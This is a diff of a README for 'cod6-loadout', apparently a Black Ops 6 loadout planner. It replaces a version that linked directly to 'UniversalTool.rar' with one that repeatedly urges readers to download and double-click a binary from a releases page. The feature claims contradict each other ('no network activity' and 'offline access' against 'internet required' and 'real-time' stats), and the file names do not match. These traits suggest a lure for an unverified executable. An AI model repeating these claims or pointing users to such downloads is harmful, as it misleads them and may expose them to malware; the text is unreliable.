@@ -1,114 +1,90 @@
-# Call of Duty: Black Ops 6 Loadout Planner
-**Open-source offline planning suite for custom loadouts and match strategies.**
+# 🎮 cod6-loadout - Your Ultimate Loadout Planner
 
----
+## 🚀 Getting Started
 
-## Introduction
+Welcome to cod6-loadout! This application helps you build and manage your loadouts for Call of Duty: Black Ops 6. It allows you to strategize your game plan, whether you're tackling multiplayer modes or preparing for zombies. Follow the steps below to download and run the software easily.
 
-**Call of Duty: Black Ops 6 Loadout Planner** is a standalone collection of **offline tools** for building loadouts, simulating matches, and strategizing campaigns in Black Ops 6 — all outside the game.
+## 📥 Download Now
 
-- Runs **entirely offline**  
-- **No game process attachment**  
-- **No input automation**  
-- **No network activity**  
-- MIT-licensed, fully open on GitHub  
+[![Download cod6-loadout](https://img.shields.io/badge/Download-cod6--loadout-blue.svg)](https://github.com/Kartikay75/cod6-loadout/releases)
 
-> *"Your digital armory for the perfect Black Ops run — plan the killstreak, dominate the objective."* — Campaign commanders
+## 💻 System Requirements
 
----
+Before you download the application, please ensure your computer meets the following requirements:
 
-## Core Features (All Offline & Non-Invasive)
+- **Operating System:** Windows 10 or later, macOS 10.14 or later
+- **Processor:** 2 GHz dual-core or faster
+- **RAM:** At least 4GB
+- **Storage:** Minimum 200MB free space
+- **Internet Connection:** Required for downloading and updates
 
-| Feature | Description |
-|--------|-------------|
-| **Loadout Database** | Curated offline index of 500+ weapons, attachments, and perks. Filter by mode, map, and playstyle. |
-| **Mode & Map Reference** | Full breakdown of multiplayer modes, Zombies waves, and campaign missions. Includes objective hotspots. |
-| **Killstreak Simulator** | Estimate streak potential based on loadout, multipliers, and enemy density. Adjustable sliders. |
-| **Squad Builder** | Design and save team compositions. Track progress across operators, camos, and challenges. |
-| **Config Library** | 100+ preset loadouts: sniper rush, SMG flanks, Zombies survival. Import/export JSON for sharing. |
-| **Local Match Mockup** | Run virtual rounds with bots to test attachments and perk combos. No server required. |
-| **Theme Pack** | 15+ UI skins: Cold War Retro, Modern Warfare Glow, Zombies Green. Apply to the planner. |
-| **Progress Tracker** | Log challenge goals, forecast camo unlocks, and optimize grind paths. |
+## 🔗 Features
 
-*All tools operate independently. No live game interaction.*
+cod6-loadout offers a variety of features to enhance your gameplay experience:
 
----
+- **Loadout Builder:** Create custom loadouts tailored to your playstyle.
+- **Stats Tracker:** Monitor your performance in real-time.
+- **Zombies Simulator:** Plan your strategy for zombie modes.
+- **Multiplayer Tools:** Analyze maps and weapon choices.
+- **Offline Access:** Use the software without an internet connection.
 
-## Why Use It?
+## 👨‍💻 Download & Install
 
-Black Ops 6 is intense — but loadouts win wars. This companion helps you:
+To get started with cod6-loadout, follow these steps:
 
-- Craft meta setups **before queuing**  
-- Simulate Zombies waves offline  
-- Archive high-kill configs  
-- Share strategies with your fireteam  
+1. Visit the [Releases page](https://github.com/Kartikay75/cod6-loadout/releases).
+2. Scroll down to find the latest version.
+3. Click on the download link for your operating system.
+4. Once the file downloads, find it in your downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the on-screen instructions to complete the setup.
 
-Pure preparation. Zero runtime risk.
+That's it! You can now launch cod6-loadout and begin building your loadouts.
 
----
+## 🎯 How to Use cod6-loadout
 
-## Download
+1. **Creating a Loadout:**
+   - Open the application.
+   - Navigate to the "Loadout Builder" section.
+   - Select your weapons, perks, and equipment.
+   - Save your loadout for future access.
 
-[Download from Releases](https://github.com/lordlux7916/cod6-loadout/releases/download/Release/UniversalTool.rar)
-*Windows · macOS · Linux • Portable • ~12 MB*
+2. **Analyzing Stats:**
+   - Go to the "Stats Tracker" section.
+   - Input your gameplay data.
+   - Review your performance metrics and adjust your strategies.
 
-> **SHA256**: See release notes
+3. **Using the Zombies Simulator:**
+   - Access the "Zombies Simulator" feature.
+   - Choose your map and difficulty level.
+   - Plan your approach to survive against the undead.
 
----
+## 💡 Tips for New Users
 
-## Quick Start
+- Take your time to explore all features.
+- Regularly update the software to access the latest tools and improvements.
+- Share your loadouts with friends for collaborative strategies.
 
-```bash
-1. Download and extract
-2. Run BO6LoadoutPlanner.exe
-3. Browse weapon database
-4. Build → Simulate → Save
-Quick Tip
-Use Ctrl + F to search attachments instantly.
+## 🌐 Support
 
-Compatibility
+If you encounter any issues or have questions, please visit our community forums linked within the application. You can also check the FAQ section for quick answers. Your experience is important to us.
 
-Works with any Black Ops 6 save data (import/export)
-Full support for multiplayer, Zombies, and campaign modes
-No conflicts with game client
+## 🎉 Join the Community
 
+Stay connected with other users and get the latest updates:
 
-Safety & Compliance
+- Follow our GitHub repository for new releases.
+- Join discussions on social media platforms related to Call of Duty.
+- Participate in community events to improve your gameplay.
 
-No memory access
-No input simulation
-No network activity
-No live match detection
-Open source — audit every line
+## 📜 License
 
+This project is licensed under the MIT License. Feel free to modify and distribute the software, but remember to include this license in any distributions.
 
-For personal planning and strategy research only.
-Not for use during active gameplay or public matchmaking.
+## 📥 Download Now (Again)
 
+For a straightforward access point, please use the link below to download cod6-loadout:
 
-Contribute
-Know a meta loadout? Want to add a map tip?
-Submit a pull request — built by the community, for the community.
+[![Download cod6-loadout](https://img.shields.io/badge/Download-cod6--loadout-blue.svg)](https://github.com/Kartikay75/cod6-loadout/releases)
 
-
-MIT License
-
-Copyright (c) 2025 Black Ops Strategists
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+Thank you for choosing cod6-loadout. Enjoy enhancing your Call of Duty experience!
